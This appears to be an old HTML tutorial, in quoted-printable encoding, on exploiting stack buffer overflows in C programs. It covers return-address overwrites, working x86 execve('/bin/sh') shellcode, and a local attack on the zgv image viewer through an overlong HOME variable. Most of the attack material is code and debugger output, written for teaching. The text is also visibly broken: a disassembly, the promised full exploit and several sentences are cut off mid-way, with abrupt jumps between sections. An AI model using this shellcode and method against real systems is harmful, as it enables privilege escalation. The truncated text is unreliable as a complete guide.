<P>Buffer overflows in user input dependent buffers have become one of =
the=20
biggest security hazards on the internet and to modern computing in =
general.=20
This is because such an error can easily be made at programming level, =
and while=20
invisible for the user who does not understand or cannot acquire the =
source=20
code, many of those errors are easy to exploit. This paper makes an =
attempt to=20
teach the novice - average C programmer how an overflow condition can be =
proven=20
to be exploitable. - Mixter=20
</P>_____________________________________________________________________=
__________=20

<H4>1. Memory</H4>
<P>Note: The way I describe it here, memory for a process is organized =
on most=20
computers, however it depends on the type of processor architecture. =
This=20
example is for x86 and also roughly applies to sparc.</P>
<P>The principle of exploiting a buffer overflow is to overwrite parts =
of memory=20
which aren't supposed to be overwritten by arbitrary input and making =
the=20
process execute this code. To see how and where an overflow takes place, =
lets=20
take a look at how memory is organized. A page is a part of memory that =
uses its=20
own relative addressing, meaning the kernel allocates initial memory for =
the=20
process, which it can then access without having to know where the =
memory is=20
physically located in RAM. The processes memory consists of three =
sections:</P>
<P>
<UL>- code segment, data in this segment are assembler instructions that =
the=20
  processor executes. The code execution is non-linear, it can skip =
code, jump,=20
  and call functions on certain conditions. Therefore, we have a pointer =
called=20
  EIP, or instruction pointer. The address where EIP points to always =
contains=20
  the code that will be executed next.</UL>
<P></P>
<P>
<UL>- data segment, space for variables and dynamic buffers</UL>
<P></P>
<P>
<UL>- stack segment, which is used to pass data (arguments) to functions =
and=20
  as a space for variables of functions. The bottom (start) of the stack =
usually=20
  resides at the very end of the virtual memory of a page, and grows =
down. The=20
  assembler command PUSHL will add to the top of the stack, and POPL =
will remove=20
  one item from the top of the stack and put it in a register. For =
accessing the=20
  stack memory directly, there is the stack pointer ESP that points at =
the top=20
  (lowest memory address) of the stack.</UL>
<P></P>__________________________________________________________________=
_____________=20

<H4>2. Functions</H4>
<P>A function is a piece of code in the code segment, that is called, =
performs a=20
task, and then returns to the previous thread of execution. Optionally,=20
arguments can be passed to a function. In assembler, it usually looks =
like this=20
(very simple example, just to get the idea):</P><PRE class=3Dcode>memory =
address		code
0x8054321 <MAIN+X>	pushl $0x0
0x8054322		call $0x80543a0 <FUNCTION>
0x8054327		ret
0x8054328		leave
...
0x80543a0 <FUNCTION>	popl %eax
0x80543a1		addl $0x1337,%eax
0x80543a4		ret
</PRE>
<P>What happens here? The main function calls function(0);</P>
<P>The variable is 0, main pushes it onto the stack, and calls the =
function. The=20
function gets the variable from the stack using popl. After finishing, =
it=20
returns to 0x8054327. Commonly, the main function would always push =
register EBP=20
on the stack, which the function stores, and restores after finishing. =
This is=20
the frame pointer concept, that allows the function to use own offsets =
for=20
addressing, which is mostly uninteresting while dealing with exploits, =
because=20
the function will not return to the original execution thread anyways. =
:-)</P>
<P>We just have to know what the stack looks like. At the top, we have =
the=20
internal buffers and variables of the function. After this, there is the =
saved=20
EBP register (32 bit, which is 4 bytes), and then the return address, =
which is=20
again 4 bytes. Further down, there are the arguments passed to the =
function,=20
which are uninteresting to us.
<P>
<P>In this case, our return address is 0x8054327. It is automatically =
stored on=20
the stack when the function is called. This return address can be =
overwritten,=20
and changed to point to any point in memory, if there is an overflow =
somewhere=20
in the=20
code.</P>________________________________________________________________=
_______________=20

<H4>3. Example of an exploitable program</H4>
<P>Lets assume that we exploit a function like this:</P><PRE =
class=3Dcode>void lame (void) { char small[30]; gets (small); =
printf("%s\n", small); }
main() { lame (); return 0; }

Compile and disassemble it:
# cc -ggdb blah.c -o blah
/tmp/cca017401.o: In function `lame':
/root/blah.c:1: the `gets' function is dangerous and should not be used.
# gdb blah
/* short explanation: gdb, the GNU debugger is used here to read the
   binary file and disassemble it (translate bytes to assembler code) */
(gdb) disas main
Dump of assembler code for function main:
0x80484c8 <MAIN>:       pushl  %ebp
0x80484c9 <MAIN+1>:     movl   %esp,%ebp

3a. Overflowing the program

     ebp:   0x787878     7895160=20
</PRE>
<P>EBP is 0x787878, this means that we have written more data on the =
stack than=20
the input buffer could handle. 0x78 is the hex representation of 'x'. =
The=20
process had a buffer of 32 bytes maximum size. We have written more data =
into=20
memory than allocated for user input and therefore overwritten EBP and =
the=20
return address with 'xxxx', and the process tried to resume execution at =
address=20
0x787878, which caused it to get a segmentation fault.</P>
<H4>3b. Changing the return address</H4>
<P>Lets try to exploit the program to return to lame() instead of =
return. We=20
have to change return address 0x80484d0 to 0x80484cb, that is all. In =
memory, we=20
have: 32 bytes buffer space | 4 bytes saved EBP | 4 bytes RET. Here is a =
simple=20
program to put the 4byte return address into a 1byte character =
buffer:</P><PRE class=3Dcode>main()
{
int i=3D0; char buf[44];
for (i=3D0;i&lt;=3D40;i+=3D4)
*(long *) &amp;buf[i] =3D 0x80484cb;
puts(buf);
}
# ret
=CB=CB=CB=CB=CB=CB=CB=CB=CB=CB=CB,

# (ret;cat)|./blah
test		 &lt;- user input
=CB=CB=CB=CB=CB=CB=CB=CB=CB=CB=CB,test
test		 &lt;- user input
test
</PRE>
<P>Here we are, the program went through the function two times. If an =
overflow=20
is present, the return address of functions can be changed to alter the =
programs=20
execution=20
thread.</P>______________________________________________________________=
_________________=20

<H4>4. Shellcode</H4>
<P>To keep it simple, shellcode is simply assembler commands, which we =
write on=20
the stack and then change the retun address to return to the stack. =
Using this=20
method, we can insert code into a vulnerable process and then execute it =
right=20
on the stack. So, lets generate insertable assembler code to run a =
shell. A=20
common system call is execve(), which loads and runs any binary, =
terminating=20
execution of the current process. The manpage gives us the =
usage:</P><PRE class=3Dcode>int  execve  (const  char  *filename, char =
*const argv [], char *const envp[]);</PRE>
<P>Lets get the details of the system call from glibc2:</P><PRE =
class=3Dcode># gdb /lib/libc.so.6
(gdb) disas execve
Dump of assembler code for function execve:
0x5da00 <EXECVE>:       pushl  %ebx

/* this is the actual syscall. before a program would call execve, it =
would
  push the arguments in reverse order on the stack: **envp, **argv, =
*filename */
/* put address of **envp into edx register */
0x5da01 <EXECVE+1>:     movl   0x10(%esp,1),%edx
/* put address of **argv into ecx register */
0x5da05 <EXECVE+5>:     movl   0xc(%esp,1),%ecx
/* put address of *filename into ebx register */
0x5da09 <EXECVE+9>:     movl   0x8(%esp,1),%ebx
/* put 0xb in eax register; 0xb =3D=3D execve in the internal system =
call table */
0x5da0d <EXECVE+13>:    movl   $0xb,%eax
/* give control to kernel, to execute execve instruction */
0x5da12 <EXECVE+18>:    int    $0x80

0x5da14 <EXECVE+20>:    popl   %ebx

0x5da1a <EXECVE+26>:    jae    0x5da1d &lt;__syscall_error&gt;
0x5da1c <EXECVE+28>:    ret
End of assembler dump.
</PRE>
<H4>4a. making the code portable</H4>
<P>We have to apply a trick to be able to make shellcode without having =
to=20
reference the arguments in memory the conventional way, by giving their =
exact=20
address on the memory page, which can only be done at compile time.</P>
<P>Once we can estimate the size of the shellcode, we can use the =
instructions=20
<SPAN class=3Dcode>jmp &lt;bytes&gt;</SPAN> and <SPAN class=3Dcode>call=20
&lt;bytes&gt;</SPAN> to go a specified number of bytes back or forth in =
the=20
execution thread. Why use a call? We have the opportunity that a CALL =
will=20
automatically store the return address on the stack, the return address =
being=20
the next 4 bytes after the CALL instruction. By placing a variable right =
behind=20
the call, we indirectly push its address on the stack without having to =
know=20
it.</P><PRE class=3Dcode>0   jmp <Z>     (skip Z bytes forward)
2   popl %esi
... put function(s) here ...
Z   call &lt;-Z+2&gt; (skip 2 less than Z bytes backward, to POPL)
Z+5 .string     (first variable)
</PRE>
<P>(Note: If you're going to write code more complex than for spawning a =
simple=20
shell, you can put more than one .string behind the code. You know the =
size of=20
those strings and can therefore calculate their relative locations once =
you know=20
where the first string is located.)</P>
<H4>4b. the shellcode</H4><PRE class=3Dcode>global code_start		/* we'll =
need this later, dont mind it */
global code_end
	.data
code_start:
	jmp  0x17
	popl %esi
	movl %esi,0x8(%esi)	/* put address of **argv behind shellcode,
				   0x8 bytes behind it so a /bin/sh has place */
	xorl %eax,%eax		/* put 0 in %eax */
	movb %eax,0x7(%esi)	/* put terminating 0 after /bin/sh string */
	movl %eax,0xc(%esi)	/* another 0 to get the size of a long word */
my_execve:
	movb $0xb,%al		/* execve(         */
	movl %esi,%ebx		/* "/bin/sh",      */
	leal 0x8(%esi),%ecx	/* &amp; of "/bin/sh", */
	xorl %edx,%edx		/* NULL		   */
	int $0x80		/* );		   */
	call -0x1c
	.string "/bin/shX"	/* X is overwritten by movb %eax,0x7(%esi) */
code_end:
</PRE>
<P>(The relative offsets 0x17 and -0x1c can be gained by putting in 0x0, =

compiling, disassembling and then looking at the shell codes size.)</P>
<P>This is already working shellcode, though very minimal. You should at =
least=20
disassemble the exit() syscall and attach it (before the 'call'). The =
real art=20
of making shellcode also consists of avoiding any binary zeroes in the =
code=20
(indicates end of input/buffer very often) and modify it for example, so =
the=20
binary code does not contain control or lower characters, which would =
get=20
filtered out by some vulnerable programs. Most of this stuff is done by=20
self-modifying code, like we had in the movb %eax,0x7(%esi) instruction. =
We=20
replaced the X with \0, but without having a \0 in the shellcode=20
initially...</P>
<P>Lets test this code... save the above code as code.S (remove =
comments) and=20
the following file as code.c:</P><PRE class=3Dcode>extern void =
code_start();
extern void code_end();
#include &lt;stdio.h&gt;
main() { ((void (*)(void)) code_start)(); }

# cc -o code code.S code.c
# ./code
bash#
</PRE>
<P>You can now convert the shellcode to a hex char buffer. Best way to =
do this=20
is, print it out:</P><PRE class=3Dcode>#include &lt;stdio.h&gt;
extern void code_start(); extern void code_end();
main() { fprintf(stderr,"%s",code_start); }
</PRE>
<P>and parse it through aconv -h or bin2c.pl, those tools can be found =

__________________________________________________=20

<H4>5. Writing an exploit</H4>
<P>Let us take a look at how to change the return address to point to =
shellcode=20
put on the stack, and write a sample exploit. We will take zgv, because =
that is=20
one of the easiest things to exploit out there :)</P><PRE class=3Dcode># =
export HOME=3D`perl -e 'printf "a" x 2000'`
# zgv
Segmentation fault (core dumped)
# gdb /usr/bin/zgv core
#0  0x61616161 in ?? ()
(gdb) info register esp
     esp: 0xbffff574 -1073744524
</PRE>
<P>Well, this is the top of the stack at crash time. It is safe to =
presume that=20
we can use this as return address to our shellcode.</P>
<P>We will now add some NOP (no operation) instructions before our =
buffer, so we=20
don't have to be 100% correct regarding the prediction of the exact =
start of our=20
shellcode in memory (or even brute forcing it). The function will return =
onto=20
the stack somewhere before our shellcode, work its way through the NOPs =
to the=20
inital JMP command, jump to the CALL, jump back to the popl, and run our =
code on=20
the stack.</P>
<P>Remember, the stack looks like this: at the lowest memory address, =
the top of=20
the stack where ESP points to, the initial variables are stored, namely =
the=20
buffer in zgv that stores the HOME environment variable. After that, we =
have the=20
saved EBP(4bytes) and the return address of the previous function. We =
must write=20
8 bytes or more behind the buffer to overwrite the return address with =
our new=20
address on the stack.</P>
<P>The buffer in zgv is 1024 bytes big. You can find that out by =
glancing at the=20
code, or by searching for the initial subl $0x400,%esp (=3D1024) in the =
vulnerable=20
function. We will now put all those parts together in the exploit:</P>

<H4>5b. further tips on writing exploits</H4>
<P>There are a lot of programs which are tough to exploit, but =
nonetheless=20
vulnerable. However, there are a lot of tricks you can do to get behind=20
filtering and such. There are also other overflow techniques which do =
not=20
necessarily include changing the return address at all or only the =
return=20
address. There are so-called pointer overflows, where a pointer that a =
function=20
allocates can be overwritten by an overflow, altering the programs =
execution=20
flow (an example is the RoTShB bind 4.9 exploit), and exploits where the =
return=20
address points to the shells environment pointer, where the shellcode is =
located=20
instead of being on the stack (this defeats very small buffers, and=20
Non-executable stack patches, and can fool some security programs, =
though it can=20
only be performed locally).</P>
<P>Another important subject for the skilled shellcode author is =
radically=20
self-modifying code, which initially only consists of printable, =
non-white upper=20
case characters, and then modifies itself to put functional shellcode on =

<H4>6. Conclusions</H4>
<P>We have learned, that once an overflow is present which is user =
dependent, it=20
can be exploited about 90% of the time, even though exploiting some =
situations=20
is difficult and takes some skill. Why is it important to write =
exploits?=20
Because ignorance is omniscient in the software industry. There have =
already=20
been reports of vulnerabilities due to buffer overflows in software, =
though the=20
software has not been updated, or the majority of users didn't update, =
because=20
the vulnerability was hard to exploit and nobody believed it created a =
security=20
risk. Then, an exploit actually comes out, proves and practically =
enables a=20
program to be exploitable, and there is usually a big (neccessary) hurry =
to=20
update it.</P>
<P>As for the programmer (you), it is a hard task to write secure =
programs, but=20
it should be taken very serious. This is a specially large concern when =
writing=20
servers, any type of security programs, or programs that are suid root, =
or=20
designed to be run by root, any special accounts, or the system itself. =
Apply=20
bounds checking (strn*, sn*, functions instead of sprintf etc.), prefer=20
allocating buffers of a dynamic, input-dependent, size, be careful on=20
for/while/etc. loops that gather data and stuff it into a buffer, and =
generally=20
handle user input with very much care are the main principles I suggest.
<P>
<P>There has also been made notable effort of the security industry to =
prevent=20
overflow problems with techniques like non-executable stack, suid =
wrappers,=20
guard programs that check return addresses, bounds checking compilers, =
and so=20
on. You should make use of those techniques where possible, but do not =
fully=20
rely on them. Do not assume to be safe at all if you run a vanilla =
two-year old=20
UNIX distribution without updates, but overflow protection or (even more =
stupid)=20
firewalling/IDS. It cannot assure security, if you continue to use =
insecure=20
programs because _all_ security programs are _software_ and can contain=20
vulnerabilities themselves, or at least not be perfect. If you apply =
frequent=20
updates _and_ security measures, you can still not expect to be secure, =
_but_=20
you can hope.
